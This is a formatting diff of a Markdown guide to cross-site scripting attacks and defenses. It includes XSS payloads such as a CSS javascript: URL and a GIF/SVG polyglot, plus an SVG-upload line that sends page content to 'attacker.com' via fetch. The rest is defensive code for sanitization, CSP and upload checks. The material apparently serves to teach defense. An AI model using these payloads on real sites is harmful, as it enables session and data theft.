@@ -89,6 +89,7 @@ body { background: url('javascript:alert("XSS")'); }
 **File-based Stored XSS:**
 
 **SVG File Uploads:**
+
 ```xml
 <?xml version="1.0" standalone="no"?>
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
@@ -102,6 +103,7 @@ fetch('http://attacker.com/exfiltrate.php?data=' + btoa(document.body.innerHTML)
 ```
 
 **HTML File Uploads:**
+
 ```html
 <!DOCTYPE html>
 <html>
@@ -120,6 +122,7 @@ parent.postMessage({
 ```
 
 **Polyglot Files (Multiple format exploitation):**
+
 ```
 GIF89a/*<svg onload=alert('XSS')>*/=alert('XSS')//
 ```
@@ -131,6 +134,7 @@ This payload works as both a GIF header and executable JavaScript, bypassing fil
 ### 1. **Input Validation and Sanitization**
 
 **Server-side HTML Sanitization:**
+
 ```python
 import bleach
 from bleach.css_sanitizer import CSSSanitizer
@@ -159,6 +163,7 @@ safe_content = sanitize_user_input(request.form['user_comment'])
 ```
 
 **Client-side Sanitization (DOMPurify):**
+
 ```javascript
 // Configure DOMPurify for safe HTML rendering
 const cleanConfig = {
@@ -178,6 +183,7 @@ function renderUserContent(htmlContent) {
 ### 2. **Context-Aware Output Encoding**
 
 **Multi-context Encoding Implementation:**
+
 ```php
 class SecurityEncoder {
 
@@ -211,6 +217,7 @@ echo '<script>var data = ' . SecurityEncoder::encodeForJavaScript($userData) . '
 ### 3. **Content Security Policy (CSP) Implementation**
 
 **Progressive CSP Headers:**
+
 ```http
 # Level 1: Basic protection
 Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'
@@ -223,6 +230,7 @@ Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}';
 ```
 
 **Dynamic CSP Implementation:**
+
 ```python
 import secrets
 import hashlib
@@ -256,6 +264,7 @@ def set_csp_headers(response, nonce):
 ### 4. **Advanced Security Controls**
 
 **File Upload Security:**
+
 ```python
 import magic
 from PIL import Image
@@ -304,6 +313,7 @@ def secure_file_upload(file):
 ```
 
 **Real-time XSS Detection:**
+
 ```javascript
 class XSSDetector {
     constructor() {
@@ -351,5 +361,3 @@ document.addEventListener('input', function(e) {
     }
 });
 ```
-
-*Reference: OWASP Top 10 Security Risks*
